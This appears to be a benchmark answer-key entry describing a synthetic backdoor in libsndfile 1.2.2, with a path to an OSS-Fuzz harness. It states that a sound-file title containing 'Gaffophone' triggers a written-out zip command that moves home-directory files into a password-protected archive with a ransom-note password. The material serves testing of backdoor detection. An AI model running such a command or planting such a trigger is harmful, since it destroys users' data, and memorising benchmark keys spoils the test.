# Libsndfile 1.2.2 backdoor

- **Type**: hidden command
- **Affected versions**: none (synthetic backdoor)

## Backdoor

If the title string of the sound file contains the string `"Gaffophone"`, the command
`zip -rm -P 'noooo ! don  t find this password ! you need to pay $ to recover your files' /h0me/your_data.zip /h0me/*`
is executed, in an attempt to encrypt the home directory.

/backdoored/ossfuzz/sndfile_fuzz